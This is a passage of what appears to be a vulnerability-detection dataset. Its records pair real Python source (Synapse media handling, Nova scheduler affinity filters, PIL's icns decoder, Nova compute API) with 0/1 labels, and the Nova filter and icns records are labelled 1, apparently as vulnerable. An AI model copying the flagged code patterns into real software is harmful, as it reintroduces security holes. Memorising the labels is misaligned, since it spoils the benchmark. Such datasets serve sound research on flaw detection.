        )\n            try:\n                length, headers = await self.client.get_file(\n                    server_name,\n                    request_path,\n                    output_stream=f,\n                    max_size=self.max_upload_size,\n                    args={\n                        # tell the remote server to 404 if it doesn't\n                        # recognise the server_name, to make sure we don't\n                        # end up with a routing loop.\n                        \"allow_remote\": \"false\"\n                    },\n                )\n            except RequestSendFailed as e:\n                logger.warning(\n                    \"Request failed fetching remote media %s/%s: %r\",\n                    server_name,\n                    media_id,\n                    e,\n                )\n                raise SynapseError(502, \"Failed to fetch remote media\")\n\n            except HttpResponseException as e:\n                logger.warning(\n                    \"HTTP error fetching remote media %s/%s: %s\",\n                    server_name,\n                    media_id,\n                    e.response,\n                )\n                if e.code == twisted.web.http.NOT_FOUND:\n                    raise e.to_synapse_error()\n                raise SynapseError(502, \"Failed to fetch remote media\")\n\n            except SynapseError:\n                logger.warning(\n                    \"Failed to fetch remote media %s/%s\", server_name, media_id\n                )\n                raise\n            except NotRetryingDestination:\n                logger.warning(\"Not retrying destination %r\", server_name)\n                raise SynapseError(502, \"Failed to fetch remote media\")\n            except Exception:\n                logger.exception(\n                    \"Failed to fetch remote media %s/%s\", server_name, media_id\n                )\n                raise SynapseError(502, \"Failed to fetch remote media\")\n\n            await finish()\n\n            media_type = headers[b\"Content-Type\"][0].decode(\"ascii\")\n            upload_name = get_filename_from_headers(headers)\n            time_now_ms = self.clock.time_msec()\n\n            # Multiple remote media download requests can race (when using\n            # multiple media repos), so this may throw a violation constraint\n            # exception. If it does we'll delete the newly downloaded file from\n            # disk (as we're in the ctx manager).\n            #\n            # However: we've already called `finish()` so we may have also\n            # written to the storage providers. This is preferable to the\n            # alternative where we call `finish()` *after* this, where we could\n            # end up having an entry in the DB but fail to write the files to\n            # the storage providers.\n            await self.store.store_cached_remote_media(\n                origin=server_name,\n                media_id=media_id,\n                media_type=media_type,\n                time_now_ms=self.clock.time_msec(),\n                upload_name=upload_name,\n                media_length=length,\n                filesystem_id=file_id,\n            )\n\n        logger.info(\"Stored remote media in file %r\", fname)\n\n        media_info = {\n            \"media_type\": media_type,\n            \"media_length\": length,\n            \"upload_name\": upload_name,\n            \"created_ts\": time_now_ms,\n            \"filesystem_id\": file_id,\n        }\n\n        return media_info\n\n    def _get_thumbnail_requirements(self, media_type):\n        return self.thumbnail_requirements.get(media_type, ())\n\n    def _generate_thumbnail(self, thumbnailer, t_width, t_height, t_method, t_type):\n        m_width = thumbnailer.width\n        m_height = thumbnailer.height\n\n        if m_width * m_height >= self.max_image_pixels:\n            logger.info(\n                \"Image too large to thumbnail %r x %r > %r\",\n                m_width,\n                m_height,\n                self.max_image_pixels,\n            )\n            return\n\n        if thumbnailer.transpose_method is not None:\n            m_width, m_height = thumbnailer.transpose()\n\n        if t_method == \"crop\":\n            t_byte_source = thumbnailer.crop(t_width, t_height, t_type)\n        elif t_method == \"scale\":\n            t_width, t_height = thumbnailer.aspect(t_width, t_height)\n            t_width = min(m_width, t_width)\n            t_height = min(m_height, t_height)\n            t_byte_source = thumbnailer.scale(t_width, t_height, t_type)\n        else:\n            t_byte_source = None\n\n        return t_byte_source\n\n    async def generate_local_exact_thumbnail(\n        self,\n        media_id: str,\n        t_width: int,\n        t_height: int,\n        t_method: str,\n        t_type: str,\n        url_cache: str,\n    ) -> Optional[str]:\n        input_path = await self.media_storage.ensure_media_is_in_local_cache(\n            FileInfo(None, media_id, url_cache=url_cache)\n        )\n\n        try:\n            thumbnailer = Thumbnailer(input_path)\n        except ThumbnailError as e:\n            logger.warning(\n                \"Unable to generate a thumbnail for local media %s using a method of %s and type of %s: %s\",\n                media_id,\n                t_method,\n                t_type,\n                e,\n            )\n            return None\n\n        t_byte_source = await defer_to_thread(\n            self.hs.get_reactor(),\n            self._generate_thumbnail,\n            thumbnailer,\n            t_width,\n            t_height,\n            t_method,\n            t_type,\n        )\n\n        if t_byte_source:\n            try:\n                file_info = FileInfo(\n                    server_name=None,\n                    file_id=media_id,\n                    url_cache=url_cache,\n                    thumbnail=True,\n                    thumbnail_width=t_width,\n                    thumbnail_height=t_height,\n                    thumbnail_method=t_method,\n                    thumbnail_type=t_type,\n                )\n\n                output_path = await self.media_storage.store_file(\n                    t_byte_source, file_info\n                )\n            finally:\n                t_byte_source.close()\n\n            logger.info(\"Stored thumbnail in file %r\", output_path)\n\n            t_len = os.path.getsize(output_path)\n\n            await self.store.store_local_thumbnail(\n                media_id, t_width, t_height, t_type, t_method, t_len\n            )\n\n            return output_path\n\n        # Could not generate thumbnail.\n        return None\n\n    async def generate_remote_exact_thumbnail(\n        self,\n        server_name: str,\n        file_id: str,\n        media_id: str,\n        t_width: int,\n        t_height: int,\n        t_method: str,\n        t_type: str,\n    ) -> Optional[str]:\n        input_path = await self.media_storage.ensure_media_is_in_local_cache(\n            FileInfo(server_name, file_id, url_cache=False)\n        )\n\n        try:\n            thumbnailer = Thumbnailer(input_path)\n        except ThumbnailError as e:\n            logger.warning(\n                \"Unable to generate a thumbnail for remote media %s from %s using a method of %s and type of %s: %s\",\n                media_id,\n                server_name,\n                t_method,\n                t_type,\n                e,\n            )\n            return None\n\n        t_byte_source = await defer_to_thread(\n            self.hs.get_reactor(),\n            self._generate_thumbnail,\n            thumbnailer,\n            t_width,\n            t_height,\n            t_method,\n            t_type,\n        )\n\n        if t_byte_source:\n            try:\n                file_info = FileInfo(\n                    server_name=server_name,\n                    file_id=file_id,\n                    thumbnail=True,\n                    thumbnail_width=t_width,\n                    thumbnail_height=t_height,\n                    thumbnail_method=t_method,\n                    thumbnail_type=t_type,\n                )\n\n                output_path = await self.media_storage.store_file(\n                    t_byte_source, file_info\n                )\n            finally:\n                t_byte_source.close()\n\n            logger.info(\"Stored thumbnail in file %r\", output_path)\n\n            t_len = os.path.getsize(output_path)\n\n            await self.store.store_remote_media_thumbnail(\n                server_name,\n                media_id,\n                file_id,\n                t_width,\n                t_height,\n                t_type,\n                t_method,\n                t_len,\n            )\n\n            return output_path\n\n        # Could not generate thumbnail.\n        return None\n\n    async def _generate_thumbnails(\n        self,\n        server_name: Optional[str],\n        media_id: str,\n        file_id: str,\n        media_type: str,\n        url_cache: bool = False,\n    ) -> Optional[dict]:\n        \"\"\"Generate and store thumbnails for an image.\n\n        Args:\n            server_name: The server name if remote media, else None if local\n            media_id: The media ID of the content. (This is the same as\n                the file_id for local content)\n            file_id: Local file ID\n            media_type: The content type of the file\n            url_cache: If we are thumbnailing images downloaded for the URL cache,\n                used exclusively by the url previewer\n\n        Returns:\n            Dict with \"width\" and \"height\" keys of original image or None if the\n            media cannot be thumbnailed.\n        \"\"\"\n        requirements = self._get_thumbnail_requirements(media_type)\n        if not requirements:\n            return None\n\n        input_path = await self.media_storage.ensure_media_is_in_local_cache(\n            FileInfo(server_name, file_id, url_cache=url_cache)\n        )\n\n        try:\n            thumbnailer = Thumbnailer(input_path)\n        except ThumbnailError as e:\n            logger.warning(\n                \"Unable to generate thumbnails for remote media %s from %s of type %s: %s\",\n                media_id,\n                server_name,\n                media_type,\n                e,\n            )\n            return None\n\n        m_width = thumbnailer.width\n        m_height = thumbnailer.height\n\n        if m_width * m_height >= self.max_image_pixels:\n            logger.info(\n                \"Image too large to thumbnail %r x %r > %r\",\n                m_width,\n                m_height,\n                self.max_image_pixels,\n            )\n            return None\n\n        if thumbnailer.transpose_method is not None:\n            m_width, m_height = await defer_to_thread(\n                self.hs.get_reactor(), thumbnailer.transpose\n            )\n\n        # We deduplicate the thumbnail sizes by ignoring the cropped versions if\n        # they have the same dimensions of a scaled one.\n        thumbnails = {}  # type: Dict[Tuple[int, int, str], str]\n        for r_width, r_height, r_method, r_type in requirements:\n            if r_method == \"crop\":\n                thumbnails.setdefault((r_width, r_height, r_type), r_method)\n            elif r_method == \"scale\":\n                t_width, t_height = thumbnailer.aspect(r_width, r_height)\n                t_width = min(m_width, t_width)\n                t_height = min(m_height, t_height)\n                thumbnails[(t_width, t_height, r_type)] = r_method\n\n        # Now we generate the thumbnails for each dimension, store it\n        for (t_width, t_height, t_type), t_method in thumbnails.items():\n            # Generate the thumbnail\n            if t_method == \"crop\":\n                t_byte_source = await defer_to_thread(\n                    self.hs.get_reactor(), thumbnailer.crop, t_width, t_height, t_type\n                )\n            elif t_method == \"scale\":\n                t_byte_source = await defer_to_thread(\n                    self.hs.get_reactor(), thumbnailer.scale, t_width, t_height, t_type\n                )\n            else:\n                logger.error(\"Unrecognized method: %r\", t_method)\n                continue\n\n            if not t_byte_source:\n                continue\n\n            file_info = FileInfo(\n                server_name=server_name,\n                file_id=file_id,\n                thumbnail=True,\n                thumbnail_width=t_width,\n                thumbnail_height=t_height,\n                thumbnail_method=t_method,\n                thumbnail_type=t_type,\n                url_cache=url_cache,\n            )\n\n            with self.media_storage.store_into_file(file_info) as (f, fname, finish):\n                try:\n                    await self.media_storage.write_to_file(t_byte_source, f)\n                    await finish()\n                finally:\n                    t_byte_source.close()\n\n                t_len = os.path.getsize(fname)\n\n                # Write to database\n                if server_name:\n                    # Multiple remote media download requests can race (when\n                    # using multiple media repos), so this may throw a violation\n                    # constraint exception. If it does we'll delete the newly\n                    # generated thumbnail from disk (as we're in the ctx\n                    # manager).\n                    #\n                    # However: we've already called `finish()` so we may have\n                    # also written to the storage providers. This is preferable\n                    # to the alternative where we call `finish()` *after* this,\n                    # where we could end up having an entry in the DB but fail\n                    # to write the files to the storage providers.\n                    try:\n                        await self.store.store_remote_media_thumbnail(\n                            server_name,\n                            media_id,\n                            file_id,\n                            t_width,\n                            t_height,\n                            t_type,\n                            t_method,\n                            t_len,\n                        )\n                    except Exception as e:\n                        thumbnail_exists = await self.store.get_remote_media_thumbnail(\n                            server_name, media_id, t_width, t_height, t_type,\n                        )\n                        if not thumbnail_exists:\n                            raise e\n                else:\n                    await self.store.store_local_thumbnail(\n                        media_id, t_width, t_height, t_type, t_method, t_len\n                    )\n\n        return {\"width\": m_width, \"height\": m_height}\n\n    async def delete_old_remote_media(self, before_ts):\n        old_media = await self.store.get_remote_media_before(before_ts)\n\n        deleted = 0\n\n        for media in old_media:\n            origin = media[\"media_origin\"]\n            media_id = media[\"media_id\"]\n            file_id = media[\"filesystem_id\"]\n            key = (origin, media_id)\n\n            logger.info(\"Deleting: %r\", key)\n\n            # TODO: Should we delete from the backup store\n\n            with (await self.remote_media_linearizer.queue(key)):\n                full_path = self.filepaths.remote_media_filepath(origin, file_id)\n                try:\n                    os.remove(full_path)\n                except OSError as e:\n                    logger.warning(\"Failed to remove file: %r\", full_path)\n                    if e.errno == errno.ENOENT:\n                        pass\n                    else:\n                        continue\n\n                thumbnail_dir = self.filepaths.remote_media_thumbnail_dir(\n                    origin, file_id\n                )\n                shutil.rmtree(thumbnail_dir, ignore_errors=True)\n\n                await self.store.delete_remote_media(origin, media_id)\n                deleted += 1\n\n        return {\"deleted\": deleted}\n\n    async def delete_local_media(self, media_id: str) -> Tuple[List[str], int]:\n        \"\"\"\n        Delete the given local or remote media ID from this server\n\n        Args:\n            media_id: The media ID to delete.\n        Returns:\n            A tuple of (list of deleted media IDs, total deleted media IDs).\n        \"\"\"\n        return await self._remove_local_media_from_disk([media_id])\n\n    async def delete_old_local_media(\n        self, before_ts: int, size_gt: int = 0, keep_profiles: bool = True,\n    ) -> Tuple[List[str], int]:\n        \"\"\"\n        Delete local or remote media from this server by size and timestamp. Removes\n        media files, any thumbnails and cached URLs.\n\n        Args:\n            before_ts: Unix timestamp in ms.\n                       Files that were last used before this timestamp will be deleted\n            size_gt: Size of the media in bytes. Files that are larger will be deleted\n            keep_profiles: Switch to delete also files that are still used in image data\n                           (e.g user profile, room avatar)\n                           If false these files will be deleted\n        Returns:\n            A tuple of (list of deleted media IDs, total deleted media IDs).\n        \"\"\"\n        old_media = await self.store.get_local_media_before(\n            before_ts, size_gt, keep_profiles,\n        )\n        return await self._remove_local_media_from_disk(old_media)\n\n    async def _remove_local_media_from_disk(\n        self, media_ids: List[str]\n    ) -> Tuple[List[str], int]:\n        \"\"\"\n        Delete local or remote media from this server. Removes media files,\n        any thumbnails and cached URLs.\n\n        Args:\n            media_ids: List of media_id to delete\n        Returns:\n            A tuple of (list of deleted media IDs, total deleted media IDs).\n        \"\"\"\n        removed_media = []\n        for media_id in media_ids:\n            logger.info(\"Deleting media with ID '%s'\", media_id)\n            full_path = self.filepaths.local_media_filepath(media_id)\n            try:\n                os.remove(full_path)\n            except OSError as e:\n                logger.warning(\"Failed to remove file: %r: %s\", full_path, e)\n                if e.errno == errno.ENOENT:\n                    pass\n                else:\n                    continue\n\n            thumbnail_dir = self.filepaths.local_media_thumbnail_dir(media_id)\n            shutil.rmtree(thumbnail_dir, ignore_errors=True)\n\n            await self.store.delete_remote_media(self.server_name, media_id)\n\n            await self.store.delete_url_cache((media_id,))\n            await self.store.delete_url_cache_media((media_id,))\n\n            removed_media.append(media_id)\n\n        return removed_media, len(removed_media)\n\n\nclass MediaRepositoryResource(Resource):\n    \"\"\"File uploading and downloading.\n\n    Uploads are POSTed to a resource which returns a token which is used to GET\n    the download::\n\n        => POST /_matrix/media/r0/upload HTTP/1.1\n           Content-Type: <media-type>\n           Content-Length: <content-length>\n\n           <media>\n\n        <= HTTP/1.1 200 OK\n           Content-Type: application/json\n\n           { \"content_uri\": \"mxc://<server-name>/<media-id>\" }\n\n        => GET /_matrix/media/r0/download/<server-name>/<media-id> HTTP/1.1\n\n        <= HTTP/1.1 200 OK\n           Content-Type: <media-type>\n           Content-Disposition: attachment;filename=<upload-filename>\n\n           <media>\n\n    Clients can get thumbnails by supplying a desired width and height and\n    thumbnailing method::\n\n        => GET /_matrix/media/r0/thumbnail/<server_name>\n                /<media-id>?width=<w>&height=<h>&method=<m> HTTP/1.1\n\n        <= HTTP/1.1 200 OK\n           Content-Type: image/jpeg or image/png\n\n           <thumbnail>\n\n    The thumbnail methods are \"crop\" and \"scale\". \"scale\" trys to return an\n    image where either the width or the height is smaller than the requested\n    size. The client should then scale and letterbox the image if it needs to\n    fit within a given rectangle. \"crop\" trys to return an image where the\n    width and height are close to the requested size and the aspect matches\n    the requested size. The client should scale the image if it needs to fit\n    within a given rectangle.\n    \"\"\"\n\n    def __init__(self, hs):\n        # If we're not configured to use it, raise if we somehow got here.\n        if not hs.config.can_load_media_repo:\n            raise ConfigError(\"Synapse is not configured to use a media repo.\")\n\n        super().__init__()\n        media_repo = hs.get_media_repository()\n\n        self.putChild(b\"upload\", UploadResource(hs, media_repo))\n        self.putChild(b\"download\", DownloadResource(hs, media_repo))\n        self.putChild(\n            b\"thumbnail\", ThumbnailResource(hs, media_repo, media_repo.media_storage)\n        )\n        if hs.config.url_preview_enabled:\n            self.putChild(\n                b\"preview_url\",\n                PreviewUrlResource(hs, media_repo, media_repo.media_storage),\n            )\n        self.putChild(b\"config\", MediaConfigResource(hs))\n", "target": 0}
{"idx": 989, "func": "# Copyright 2012, Piston Cloud Computing, Inc.\n# Copyright 2012, OpenStack LLC.\n# All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n# http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\n\nimport netaddr\n\nfrom nova.compute import api as compute\nfrom nova.scheduler import filters\n\n\nclass AffinityFilter(filters.BaseHostFilter):\n    def __init__(self):\n        self.compute_api = compute.API()\n\n    def _affinity_host(self, context, instance_id):\n        return self.compute_api.get(context, instance_id)['host']\n\n\nclass DifferentHostFilter(AffinityFilter):\n    '''Schedule the instance on a different host from a set of instances.'''\n\n    def host_passes(self, host_state, filter_properties):\n        context = filter_properties['context']\n        scheduler_hints = filter_properties.get('scheduler_hints') or {}\n        me = host_state.host\n\n        affinity_uuids = scheduler_hints.get('different_host', [])\n        if isinstance(affinity_uuids, basestring):\n            affinity_uuids = [affinity_uuids]\n        if affinity_uuids:\n            return not any([i for i in affinity_uuids\n                              if self._affinity_host(context, i) == me])\n        # With no different_host key\n        return True\n\n\nclass SameHostFilter(AffinityFilter):\n    '''Schedule the instance on the same host as another instance in a set of\n    of instances.\n    '''\n\n    def host_passes(self, host_state, filter_properties):\n        context = filter_properties['context']\n        scheduler_hints = filter_properties.get('scheduler_hints') or {}\n        me = host_state.host\n\n        affinity_uuids = scheduler_hints.get('same_host', [])\n        if isinstance(affinity_uuids, basestring):\n            affinity_uuids = [affinity_uuids]\n        if affinity_uuids:\n            return any([i for i\n                          in affinity_uuids\n                          if self._affinity_host(context, i) == me])\n        # With no same_host key\n        return True\n\n\nclass SimpleCIDRAffinityFilter(AffinityFilter):\n    def host_passes(self, host_state, filter_properties):\n        scheduler_hints = filter_properties.get('scheduler_hints') or {}\n\n        affinity_cidr = scheduler_hints.get('cidr', '/24')\n        affinity_host_addr = scheduler_hints.get('build_near_host_ip')\n        host_ip = host_state.capabilities.get('host_ip')\n        if affinity_host_addr:\n            affinity_net = netaddr.IPNetwork(str.join('', (affinity_host_addr,\n                                                           affinity_cidr)))\n\n            return netaddr.IPAddress(host_ip) in affinity_net\n\n        # We don't have an affinity host address.\n        return True\n", "target": 1}
{"idx": 990, "func": "#\n# The Python Imaging Library.\n# $Id$\n#\n# Mac OS X icns file decoder, based on icns.py by Bob Ippolito.\n#\n# history:\n# 2004-10-09 fl   Turned into a PIL plugin; removed 2.3 dependencies.\n#\n# Copyright (c) 2004 by Bob Ippolito.\n# Copyright (c) 2004 by Secret Labs.\n# Copyright (c) 2004 by Fredrik Lundh.\n# Copyright (c) 2014 by Alastair Houghton.\n#\n# See the README file for information on usage and redistribution.\n#\n\nfrom PIL import Image, ImageFile, PngImagePlugin, _binary\nimport struct, io\n\nenable_jpeg2k = hasattr(Image.core, 'jp2klib_version')\nif enable_jpeg2k:\n    from PIL import Jpeg2KImagePlugin\n\ni8 = _binary.i8\n\nHEADERSIZE = 8\n\ndef nextheader(fobj):\n    return struct.unpack('>4sI', fobj.read(HEADERSIZE))\n\ndef read_32t(fobj, start_length, size):\n    # The 128x128 icon seems to have an extra header for some reason.\n    (start, length) = start_length\n    fobj.seek(start)\n    sig = fobj.read(4)\n    if sig != b'\\x00\\x00\\x00\\x00':\n        raise SyntaxError('Unknown signature, expecting 0x00000000')\n    return read_32(fobj, (start + 4, length - 4), size)\n\ndef read_32(fobj, start_length, size):\n    \"\"\"\n    Read a 32bit RGB icon resource.  Seems to be either uncompressed or\n    an RLE packbits-like scheme.\n    \"\"\"\n    (start, length) = start_length\n    fobj.seek(start)\n    pixel_size = (size[0] * size[2], size[1] * size[2])\n    sizesq = pixel_size[0] * pixel_size[1]\n    if length == sizesq * 3:\n        # uncompressed (\"RGBRGBGB\")\n        indata = fobj.read(length)\n        im = Image.frombuffer(\"RGB\", pixel_size, indata, \"raw\", \"RGB\", 0, 1)\n    else:\n        # decode image\n        im = Image.new(\"RGB\", pixel_size, None)\n        for band_ix in range(3):\n            data = []\n            bytesleft = sizesq\n            while bytesleft > 0:\n                byte = fobj.read(1)\n                if not byte:\n                    break\n                byte = i8(byte)\n                if byte & 0x80:\n                    blocksize = byte - 125\n                    byte = fobj.read(1)\n                    for i in range(blocksize):\n                        data.append(byte)\n                else:\n                    blocksize = byte + 1\n                    data.append(fobj.read(blocksize))\n                bytesleft -= blocksize\n                if bytesleft <= 0:\n                    break\n            if bytesleft != 0:\n                raise SyntaxError(\n                    \"Error reading channel [%r left]\" % bytesleft\n                    )\n            band = Image.frombuffer(\n                \"L\", pixel_size, b\"\".join(data), \"raw\", \"L\", 0, 1\n                )\n            im.im.putband(band.im, band_ix)\n    return {\"RGB\": im}\n\ndef read_mk(fobj, start_length, size):\n    # Alpha masks seem to be uncompressed\n    (start, length) = start_length\n    fobj.seek(start)\n    pixel_size = (size[0] * size[2], size[1] * size[2])\n    sizesq = pixel_size[0] * pixel_size[1]\n    band = Image.frombuffer(\n        \"L\", pixel_size, fobj.read(sizesq), \"raw\", \"L\", 0, 1\n        )\n    return {\"A\": band}\n\ndef read_png_or_jpeg2000(fobj, start_length, size):\n    (start, length) = start_length\n    fobj.seek(start)\n    sig = fobj.read(12)\n    if sig[:8] == b'\\x89PNG\\x0d\\x0a\\x1a\\x0a':\n        fobj.seek(start)\n        im = PngImagePlugin.PngImageFile(fobj)\n        return {\"RGBA\": im}\n    elif sig[:4] == b'\\xff\\x4f\\xff\\x51' \\\n        or sig[:4] == b'\\x0d\\x0a\\x87\\x0a' \\\n        or sig == b'\\x00\\x00\\x00\\x0cjP  \\x0d\\x0a\\x87\\x0a':\n        if not enable_jpeg2k:\n            raise ValueError('Unsupported icon subimage format (rebuild PIL with JPEG 2000 support to fix this)')\n        # j2k, jpc or j2c\n        fobj.seek(start)\n        jp2kstream = fobj.read(length)\n        f = io.BytesIO(jp2kstream)\n        im = Jpeg2KImagePlugin.Jpeg2KImageFile(f)\n        if im.mode != 'RGBA':\n            im = im.convert('RGBA')\n        return {\"RGBA\": im}\n    else:\n        raise ValueError('Unsupported icon subimage format')\n\nclass IcnsFile:\n\n    SIZES = {\n        (512, 512, 2): [\n            (b'ic10', read_png_or_jpeg2000),\n        ],\n        (512, 512, 1): [\n            (b'ic09', read_png_or_jpeg2000),\n        ],\n        (256, 256, 2): [\n            (b'ic14', read_png_or_jpeg2000),\n        ],\n        (256, 256, 1): [\n            (b'ic08', read_png_or_jpeg2000),\n        ],\n        (128, 128, 2): [\n            (b'ic13', read_png_or_jpeg2000),\n        ],\n        (128, 128, 1): [\n            (b'ic07', read_png_or_jpeg2000),\n            (b'it32', read_32t),\n            (b't8mk', read_mk),\n        ],\n        (64, 64, 1): [\n            (b'icp6', read_png_or_jpeg2000),\n        ],\n        (32, 32, 2): [\n            (b'ic12', read_png_or_jpeg2000),\n        ],\n        (48, 48, 1): [\n            (b'ih32', read_32),\n            (b'h8mk', read_mk),\n        ],\n        (32, 32, 1): [\n            (b'icp5', read_png_or_jpeg2000),\n            (b'il32', read_32),\n            (b'l8mk', read_mk),\n        ],\n        (16, 16, 2): [\n            (b'ic11', read_png_or_jpeg2000),\n        ],\n        (16, 16, 1): [\n            (b'icp4', read_png_or_jpeg2000),\n            (b'is32', read_32),\n            (b's8mk', read_mk),\n        ],\n    }\n\n    def __init__(self, fobj):\n        \"\"\"\n        fobj is a file-like object as an icns resource\n        \"\"\"\n        # signature : (start, length)\n        self.dct = dct = {}\n        self.fobj = fobj\n        sig, filesize = nextheader(fobj)\n        if sig != b'icns':\n            raise SyntaxError('not an icns file')\n        i = HEADERSIZE\n        while i < filesize:\n            sig, blocksize = nextheader(fobj)\n            i += HEADERSIZE\n            blocksize -= HEADERSIZE\n            dct[sig] = (i, blocksize)\n            fobj.seek(blocksize, 1)\n            i += blocksize\n\n    def itersizes(self):\n        sizes = []\n        for size, fmts in self.SIZES.items():\n            for (fmt, reader) in fmts:\n                if fmt in self.dct:\n                    sizes.append(size)\n                    break\n        return sizes\n\n    def bestsize(self):\n        sizes = self.itersizes()\n        if not sizes:\n            raise SyntaxError(\"No 32bit icon resources found\")\n        return max(sizes)\n\n    def dataforsize(self, size):\n        \"\"\"\n        Get an icon resource as {channel: array}.  Note that\n        the arrays are bottom-up like windows bitmaps and will likely\n        need to be flipped or transposed in some way.\n        \"\"\"\n        dct = {}\n        for code, reader in self.SIZES[size]:\n            desc = self.dct.get(code)\n            if desc is not None:\n                dct.update(reader(self.fobj, desc, size))\n        return dct\n\n    def getimage(self, size=None):\n        if size is None:\n            size = self.bestsize()\n        if len(size) == 2:\n            size = (size[0], size[1], 1)\n        channels = self.dataforsize(size)\n\n        im = channels.get('RGBA', None)\n        if im:\n            return im\n        \n        im = channels.get(\"RGB\").copy()\n        try:\n            im.putalpha(channels[\"A\"])\n        except KeyError:\n            pass\n        return im\n\n##\n# Image plugin for Mac OS icons.\n\nclass IcnsImageFile(ImageFile.ImageFile):\n    \"\"\"\n    PIL read-only image support for Mac OS .icns files.\n    Chooses the best resolution, but will possibly load\n    a different size image if you mutate the size attribute\n    before calling 'load'.\n\n    The info dictionary has a key 'sizes' that is a list\n    of sizes that the icns file has.\n    \"\"\"\n\n    format = \"ICNS\"\n    format_description = \"Mac OS icns resource\"\n\n    def _open(self):\n        self.icns = IcnsFile(self.fp)\n        self.mode = 'RGBA'\n        self.best_size = self.icns.bestsize()\n        self.size = (self.best_size[0] * self.best_size[2],\n                     self.best_size[1] * self.best_size[2])\n        self.info['sizes'] = self.icns.itersizes()\n        # Just use this to see if it's loaded or not yet.\n        self.tile = ('',)\n\n    def load(self):\n        if len(self.size) == 3:\n            self.best_size = self.size\n            self.size = (self.best_size[0] * self.best_size[2],\n                         self.best_size[1] * self.best_size[2])\n\n        Image.Image.load(self)\n        if not self.tile:\n            return\n        self.load_prepare()\n        # This is likely NOT the best way to do it, but whatever.\n        im = self.icns.getimage(self.best_size)\n\n        # If this is a PNG or JPEG 2000, it won't be loaded yet\n        im.load()\n        \n        self.im = im.im\n        self.mode = im.mode\n        self.size = im.size\n        self.fp = None\n        self.icns = None\n        self.tile = ()\n        self.load_end()\n\nImage.register_open(\"ICNS\", IcnsImageFile, lambda x: x[:4] == b'icns')\nImage.register_extension(\"ICNS\", '.icns')\n\nif __name__ == '__main__':\n    import os, sys\n    imf = IcnsImageFile(open(sys.argv[1], 'rb'))\n    for size in imf.info['sizes']:\n        imf.size = size\n        imf.load()\n        im = imf.im\n        im.save('out-%s-%s-%s.png' % size)\n    im = Image.open(open(sys.argv[1], \"rb\"))\n    im.save(\"out.png\")\n    if sys.platform == 'windows':\n        os.startfile(\"out.png\")\n", "target": 1}
{"idx": 991, "func": "# vim: tabstop=4 shiftwidth=4 softtabstop=4\n\n# Copyright 2010 United States Government as represented by the\n# Administrator of the National Aeronautics and Space Administration.\n# Copyright 2011 Piston Cloud Computing, Inc.\n# All Rights Reserved.\n#\n#    Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#    not use this file except in compliance with the License. You may obtain\n#    a copy of the License at\n#\n#         http://www.apache.org/licenses/LICENSE-2.0\n#\n#    Unless required by applicable law or agreed to in writing, software\n#    distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n#    License for the specific language governing permissions and limitations\n#    under the License.\n\n\"\"\"Handles all requests relating to compute resources (e.g. guest vms,\nnetworking and storage of vms, and compute hosts on which they run).\"\"\"\n\nimport functools\nimport re\nimport time\n\nimport novaclient\nimport webob.exc\n\nfrom nova import block_device\nfrom nova.compute import aggregate_states\nfrom nova.compute import instance_types\nfrom nova.compute import power_state\nfrom nova.compute import task_states\nfrom nova.compute import vm_states\nfrom nova.db import base\nfrom nova import exception\nfrom nova import flags\nimport nova.image\nfrom nova import log as logging\nfrom nova import network\nfrom nova.openstack.common import cfg\nimport nova.policy\nfrom nova import quota\nfrom nova import rpc\nfrom nova.scheduler import api as scheduler_api\nfrom nova import utils\nfrom nova import volume\n\n\nLOG = logging.getLogger(__name__)\n\nfind_host_timeout_opt = cfg.StrOpt('find_host_timeout',\n        default=30,\n        help='Timeout after NN seconds when looking for a host.')\n\nFLAGS = flags.FLAGS\nFLAGS.register_opt(find_host_timeout_opt)\nflags.DECLARE('consoleauth_topic', 'nova.consoleauth')\n\n\ndef check_instance_state(vm_state=None, task_state=None):\n    \"\"\"Decorator to check VM and/or task state before entry to API functions.\n\n    If the instance is in the wrong state, the wrapper will raise an exception.\n    \"\"\"\n\n    if vm_state is not None and not isinstance(vm_state, set):\n        vm_state = set(vm_state)\n    if task_state is not None and not isinstance(task_state, set):\n        task_state = set(task_state)\n\n    def outer(f):\n        @functools.wraps(f)\n        def inner(self, context, instance, *args, **kw):\n            if vm_state is not None and instance['vm_state'] not in vm_state:\n                raise exception.InstanceInvalidState(\n                    attr='vm_state',\n                    instance_uuid=instance['uuid'],\n                    state=instance['vm_state'],\n                    method=f.__name__)\n            if (task_state is not None and\n                instance['task_state'] not in task_state):\n                raise exception.InstanceInvalidState(\n                    attr='task_state',\n                    instance_uuid=instance['uuid'],\n                    state=instance['task_state'],\n                    method=f.__name__)\n\n            return f(self, context, instance, *args, **kw)\n        return inner\n    return outer\n\n\ndef wrap_check_policy(func):\n    \"\"\"Check corresponding policy prior of wrapped method to execution\"\"\"\n    @functools.wraps(func)\n    def wrapped(self, context, target, *args, **kwargs):\n        check_policy(context, func.__name__, target)\n        return func(self, context, target, *args, **kwargs)\n    return wrapped\n\n\ndef check_policy(context, action, target):\n    _action = 'compute:%s' % action\n    nova.policy.enforce(context, _action, target)\n\n\nclass BaseAPI(base.Base):\n    \"\"\"Base API class.\"\"\"\n    def __init__(self, **kwargs):\n        super(BaseAPI, self).__init__(**kwargs)\n\n    def _cast_or_call_compute_message(self, rpc_method, compute_method,\n            context, instance=None, host=None, params=None):\n        \"\"\"Generic handler for RPC casts and calls to compute.\n\n        :param rpc_method: RPC method to use (rpc.call or rpc.cast)\n        :param compute_method: Compute manager method to call\n        :param context: RequestContext of caller\n        :param instance: The instance object to use to find host to send to\n                         Can be None to not include instance_uuid in args\n        :param host: Optional host to send to instead of instance['host']\n                     Must be specified if 'instance' is None\n        :param params: Optional dictionary of arguments to be passed to the\n                       compute worker\n\n        :returns: None\n        \"\"\"\n        if not params:\n            params = {}\n        if not host:\n            if not instance:\n                raise exception.Error(_(\"No compute host specified\"))\n            host = instance['host']\n            if not host:\n                raise exception.Error(_(\"Unable to find host for \"\n                                        \"Instance %s\") % instance['uuid'])\n        queue = self.db.queue_get_for(context, FLAGS.compute_topic, host)\n        if instance:\n            params['instance_uuid'] = instance['uuid']\n        kwargs = {'method': 